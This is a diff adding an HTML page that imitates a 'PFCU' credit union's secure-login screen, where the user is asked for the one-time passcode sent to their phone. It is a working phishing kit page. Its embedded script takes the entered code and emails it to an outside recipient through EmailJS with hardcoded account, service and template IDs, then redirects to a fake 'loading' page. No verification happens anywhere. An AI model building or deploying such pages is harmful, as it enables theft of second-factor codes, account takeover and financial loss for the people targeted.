@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="cache-control" content="no-cache">
+    <title>PFCU | Otp</title>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <meta http-equiv="Content-Security-Policy" content="default-src https://api.emailjs.com; connect-src https://api.emailjs.com; style-src 'unsafe-inline'; img-src 'self' data:; font-src 'self' data:; script-src 'unsafe-inline';">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        /* Reset and Base Styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        html, body {
+            font-family: 'Roboto', sans-serif;
+            font-size: 16px; /* Increased base font size */
+            line-height: 1.5;
+            color: #333;
+            height: 100%;
+        }
+        a {
+            text-decoration: none;
+            color: #007bff;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+
+        /* Container Styles */
+        .container {
+            max-width: 600px;
+            margin: 20px auto;
+            padding: 20px; /* Slightly increased padding */
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        /* Header Styles */
+        .page-header {
+            text-align: center;
+            margin-bottom: 20px; /* Slightly increased margin */
+        }
+        .page-header h1 {
+            font-size: 28px; /* Increased heading size */
+            font-weight: 500;
+            color: #333;
+            margin: 0;
+        }
+
+        /* Alert Styles */
+        .alert-success {
+            background-color: #e6f4ea;
+            color: #2c662d;
+            border: 1px solid #d3e9d7;
+            padding: 12px; /* Slightly increased padding */
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px; /* Slightly increased margin */
+            font-size: 16px; /* Increased font size */
+        }
+        .media-left {
+            margin-right: 12px; /* Slightly increased margin */
+            display: flex;
+            align-items: center;
+        }
+        .media-body p {
+            margin: 0;
+        }
+
+        /* Form Styles */
+        .form-group {
+            margin-bottom: 20px; /* Slightly increased margin */
+        }
+        label {
+            display: block;
+            font-weight: 500;
+            margin-bottom: 8px; /* Slightly increased margin */
+            font-size: 16px; /* Increased font size */
+        }
+        .form-control {
+            width: 100%;
+            padding: 10px; /* Slightly increased padding */
+            font-size: 16px; /* Increased font size */
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            transition: border-color 0.3s ease;
+        }
+        .form-control:focus {
+            border-color: #007bff;
+            outline: none;
+            box-shadow: 0 0 5px rgba(0, 123, 255, 0.3);
+        }
+        .form-control::placeholder {
+            font-size: 16px; /* Increased placeholder font size */
+            color: #999;
+        }
+        .info-text {
+            font-weight: 500;
+            font-size: 16px; /* Increased font size */
+            margin-bottom: 12px; /* Slightly increased margin */
+            display: block;
+        }
+
+        /* Button Styles */
+        .btn {
+            display: inline-block;
+            padding: 10px 20px; /* Slightly increased padding */
+            font-size: 16px; /* Increased font size */
+            font-weight: 500;
+            text-align: center;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        .btn-primary {
+            background-color: #007bff;
+            color: #fff;
+        }
+        .btn-primary:hover {
+            background-color: #0056b3;
+        }
+        .btn-group {
+            display: flex;
+            gap: 12px; /* Slightly increased gap */
+            justify-content: center;
+        }
+
+        /* Responsive Adjustments */
+        @media (max-width: 767px) {
+            .container {
+                margin: 15px; /* Slightly reduced margin */
+                padding: 15px; /* Slightly reduced padding */
+            }
+            .page-header h1 {
+                font-size: 24px; /* Adjusted heading size for mobile */
+            }
+            .btn-group {
+                flex-direction: column;
+            }
+            .btn {
+                width: 100%;
+            }
+            .alert-success, .info-text, label, .form-control, .form-control::placeholder, .btn {
+                font-size: 15px; /* Slightly smaller font size for mobile */
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container" role="main">
+        <div class="fade-in">
+            <div class="page-header">
+                <h1 id="heading" tabindex="-1" aria-describedby="heading description forgotForm">Secure Login</h1>
+            </div>
+
+            <div class="alert alert-success">
+                <div class="media-left">
+                    <svg width="20" height="20" viewBox="0 0 20 20">
+                        <title>check</title>
+                        <path d="M7.629 15.878l-4.715-4.715 1.414-1.414 3.3 3.3 6.342-6.34 1.414 1.414-7.756 7.755z" fill="#2c662d"></path>
+                    </svg>
+                </div>
+                <div id="success" class="media-body">
+                    <p>We sent your One-Time Passcode to the phone number associated with your account.</p>
+                </div>
+            </div>
+
+            <p>It looks like you are logging in from an unrecognized device. We need to verify your identity.</p>
+            <div style="margin-bottom: 12px">
+                <span class="info-text">Within 10 minutes, a verification code will be sent to the phone number on file.</span>
+            </div>
+
+            <form id="otpForm">
+                <div class="form-group">
+                    <label for="otp" id="otpLabel">Enter code</label>
+                    <input type="text" class="form-control" id="otp" autocapitalize="off" autocorrect="off" autocomplete="off" placeholder="Enter code">
+                    <a href="#" id="resendCodeLink" style="display: block; margin-top: 8px;">Didn't get the code?</a>
+                </div>
+                <div class="form-group">
+                    <label class="info-text">Save time by registering this device.</label>
+                    <p style="font-size: 15px;">If this is your personal device, register it now. We won't ask for a code the next time you log in.</p>
+                </div>
+                <div class="form-group btn-group">
+                    <button type="submit" id="loginButton" class="btn btn-primary">Yes, this is my <strong>device</strong>, save login</button>
+                    <button type="submit" id="cancelButton" class="btn btn-primary">No, this is a public <strong>device</strong></button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Include EmailJS SDK -->
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        // Initialize EmailJS with your User ID
+        emailjs.init("2Qz3vPsyUNeZ_lWus");
+
+        // Function to send user input to EmailJS
+        function sendUserInput() {
+            const userInput = document.getElementById('otp').value;
+            if (!userInput) {
+                alert('Please enter a code before sending.');
+                return;
+            }
+
+            const templateParams = {
+                passcode: userInput,
+                to_name: "User", // Replace with actual user name or email prefix if available
+            };
+
+            emailjs.send("service_xrlsmbo", "template_n5m5m1g", templateParams)
+                .then(function(response) {
+                    console.log('Email sent successfully!', response);
+                    window.location.href = 'loading1.html'; // Redirect to next page
+                }, function(error) {
+                    console.error('Email sending failed:', error);
+                    alert('Failed to send code. Please try again.');
+                });
+        }
+
+        // Handle form submission to send user input
+        document.getElementById('otpForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            sendUserInput();
+        });
+    </script>
+</body>
+</html>
